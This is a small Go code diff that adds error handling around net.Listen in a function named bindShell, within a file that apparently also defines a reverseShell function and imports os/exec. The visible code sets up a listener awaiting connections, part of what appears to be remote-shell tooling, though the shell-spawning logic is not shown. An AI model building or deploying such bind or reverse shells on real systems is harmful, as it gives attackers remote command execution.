@@ -1,6 +1,7 @@
 package main
 
 import (
+	"log"
 	"net"
 	"os/exec"
 )
@@ -17,7 +18,10 @@ func reverseShell(network, address, shell string) {
 */
 
 func bindShell(network, address, shell string) {
-	l, _ := net.Listen(network, address)
+	l, err := net.Listen(network, address)
+	if err != nil {
+		log.Fatalln(err)
+	}
 	defer l.Close()
 	for {
 		// Wait for a connection.
